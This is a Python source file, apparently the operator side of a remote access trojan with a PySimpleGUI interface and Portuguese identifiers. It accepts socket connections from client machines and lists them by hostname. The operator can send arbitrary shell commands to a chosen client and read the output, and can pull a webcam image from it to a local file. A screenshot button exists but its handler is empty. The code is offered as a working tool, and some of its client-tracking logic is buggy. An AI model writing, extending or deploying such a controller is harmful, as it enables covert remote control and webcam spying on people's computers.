import socket
import PySimpleGUI as sg
import buttons


class main():
    def __init__(self):
        self.HOST = '127.0.0.1'
        self.port = 8221
        self.clientes_conectados = []
        self.servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.servidor.settimeout(1)
        self.servidor.bind((self.HOST, self.port))
        self.servidor.listen()
        self.n_cliente = 0
        self.deu_ruim = ''
        self.lista_str = ''
        self.lista_quantidade_clientes = ['']
        self.client_hostname_list = []
        self.validation = False
        self.tem_web = ''

    def do_connections(self):
        while True:
            try:

                self.conn, self.addr = self.servidor.accept()

                self.clientes_conectados.append((self.conn, self.addr))
                try:
                    self.conn.send(str.encode('envie seu nome'))
                except:
                    print('nao enviou adicionado')

                self.client_hostname = self.conn.recv(1024).decode()


                self.client_hostname_list.append(self.client_hostname)



                self.n_cliente +=1

                print('Cliente {} conectado! hostname: {}'.format(self.n_cliente, self.client_hostname))

            except:
                if self.n_cliente == 0:

                    print('Nenhum cliente conectado!')
                    self.clientes_conectados = []
                    break
                else:


                    break



    def iniciar(self):
        self.while_principal = 1
        while self.while_principal == 1:
            while True:
                class_.do_connections()

                class_.removendo_clientes_que_desconectaram()

                class_.criando_output_clientes_conectados()
                sg.change_look_and_feel('DarkTeal2')
                self.layout = [
                    [sg.Text('CLIENTES CONECTADOS')],
                    [sg.Text('n° clientes: {}'.format(self.numero_de_clientes))],
                    [sg.Text(self.lista_str)],
                    [sg.Text('Em qual cliente deseja se conectar:'),sg.OptionMenu((self.lista_quantidade_clientes),key='conectar_em')],
                    [sg.Text('')],
                    [sg.Text('')],
                    [sg.Text('{}:'.format(self.escrita)),sg.Button('',image_data=self.botao, key='conectar'),sg.Text('Reload:'),
                     sg.Button('', image_data=buttons.reload_button, key='reload')],
                    [sg.Text(self.deu_ruim)]
                ]
                self.janela = sg.Window('Servidor',resizable=True).layout(self.layout)
                self.values = self.janela.Read()


                if self.values[0] == None:
                    self.janela.close()
                    self.while_principal = 0
                    break
                elif self.values[0] == 'reload':
                    self.janela.close()
                    self.deu_ruim = ''
                else:  #play
                    self.janela.close()
                    if self.values[1]['conectar_em'] != '':
                        self.validation = True
                        break
                    else:
                        self.deu_ruim = 'Selecione o cliente que deseja se conectar!'

            class_.cliente_definido()




    def removendo_clientes_que_desconectaram(self):

        self.duplicaca_clientes_conectados = self.clientes_conectados
        try:
            self.COUNT123 = -1
            for i in self.duplicaca_clientes_conectados:
                self.conn = i[0]
                self.COUNT123 +=1
                try:
                    self.conn.send(str.encode('check'))
                    self.recebe = self.conn.recv(1024).decode()
                    print(self.recebe)
                except:
                    self.clientes_conectados.remove(i)
                    self.client_hostname_list.remove(self.COUNT123)
        except:
            pass


    def criando_output_clientes_conectados(self):
        print('{} clientes conectados!'.format(len(self.clientes_conectados)))
        self.lista_str = ''
        self.numero = 0
        self.lista_quantidade_clientes = []
        self.numero_de_clientes = len(self.clientes_conectados)
        try:
            for i in self.clientes_conectados:
                self.lista_str += str(
                    '[{}] {}\n'.format((self.numero + 1), self.client_hostname_list[self.numero]))
                self.numero += 1
                self.lista_quantidade_clientes.append(self.numero)
            if self.lista_quantidade_clientes == []:
                self.lista_quantidade_clientes = ['']
        except:
            pass
        self.validation = False
        if self.clientes_conectados != []:
            self.botao = buttons.play_button
            self.escrita = 'Conectar'
        else:
            self.botao = buttons.close
            self.escrita = 'Sair'

    def cliente_definido(self):

        self.numero_cliente_escolhido = int(self.values[1]['conectar_em'])
        while self.validation == True:

            self.cliente_escolhido = self.clientes_conectados[(self.numero_cliente_escolhido -1)][0]
            sg.change_look_and_feel('DarkTeal2')
            self.layout = [
                [sg.Text('',size=20),sg.Button('CMD', key='cmd'),sg.Text('',size=20),],
                [sg.Text('',size=20),sg.Button('PRINT WEBCAM', key='web'),sg.Text(self.tem_web,size=20)],
                [sg.Text('',size=20),sg.Button('PRINTAR TELA', key='print'),sg.Text('',size=20),],
                [sg.Text('', size=20)],
                [sg.Button('', image_data=buttons.left_arrow, key='voltar')]
            ]
            self.janela = sg.Window('[{}] {}'.format(self.numero_cliente_escolhido,self.client_hostname_list[self.numero_cliente_escolhido-1]),resizable=True,icon='lee.ico').layout(self.layout)
            self.valores = self.janela.Read()
            if self.valores[0] == 'voltar':
                self.janela.close()
                self.cliente_escolhido.send(str.encode('desconectando'))
                self.validation = False
            if self.valores[0] == None:
                self.janela.close()
                self.cliente_escolhido.send(str.encode('desconectando'))
                self.validation = False




            class_.cmd()
            class_.web()
            class_.print()





    def cmd(self):
        if self.valores[0] == 'cmd':
            self.cliente_escolhido.send(str.encode('cmd'))
            self.output = ''
            self.msg = self.cliente_escolhido.recv(1024).decode()
            print(self.msg)
            while True:
                self.janela.close()
                sg.change_look_and_feel('DarkTeal2')
                self.layout = [
                    [sg.Text('', size=50)],
                    [sg.Multiline(self.output,size=(90,25))],
                    [sg.Text('', size=50)],
                    [sg.Text('>'), sg.Input('', key='comando'),sg.Button('', image_data=buttons.play_button, key='play')],

                    [sg.Text('',size=60),sg.Button('', image_data=buttons.left_arrow, key='voltar')]
                ]


                self.janela = sg.Window('PROMPOT DE COMANDO',resizable=True, icon='lee.ico').layout(self.layout)
                self.values = self.janela.Read()
                if self.values[0] == 'play':
                    self.cliente_escolhido.send(str.encode(self.values[1]['comando']))
                    self.output = self.cliente_escolhido.recv(2048).decode()
                elif self.values[0] == 'voltar':
                    self.janela.close()
                    self.cliente_escolhido.send(str.encode('back'))
                    break
                elif self.values[0] == None:
                    self.janela.close()
                    self.cliente_escolhido.send(str.encode('back'))
                    break


    def web(self):
        if self.valores[0] == 'web':
            print('entrou web')
            self.janela.close()
            self.cliente_escolhido.send(str.encode('web'))
#-----------------------------------------------------------------------------------------------
            self.arquivo = open("img_recebida.png", 'wb')

            self.fim = 0


            while True:
                print("aquiiiiiiiiiiiiiiiiiiii")
                self.ler_bfferl = self.cliente_escolhido.recv(1000000000)  # aloca o resto no buffer
                print(self.ler_bfferl)
                if self.ler_bfferl == b'nao tem web':
                    print('o cliente nao tem webcam')
                    self.tem_web = 'cam não encontrada'
                    break

                if self.ler_bfferl == b'arquivo enviado':
                    # print('deu break com arquivo enviado dentro do ler_bfeerl tododo')
                    break

                final_buffer = self.ler_bfferl[-15:]

                if final_buffer == b'arquivo enviado':
                    self.ler_bfferl = self.ler_bfferl[:-16]
                    self.arquivo.write(self.ler_bfferl)
                    break

                self.arquivo.write(self.ler_bfferl)  # escreve no arquivo o buffer recebido















#-----------------------------------------------------------------------------------------------

    def print(self):
        if self.valores[0] == 'print':
            self.janela.close()
            pass















class_ = main()
class_.iniciar()


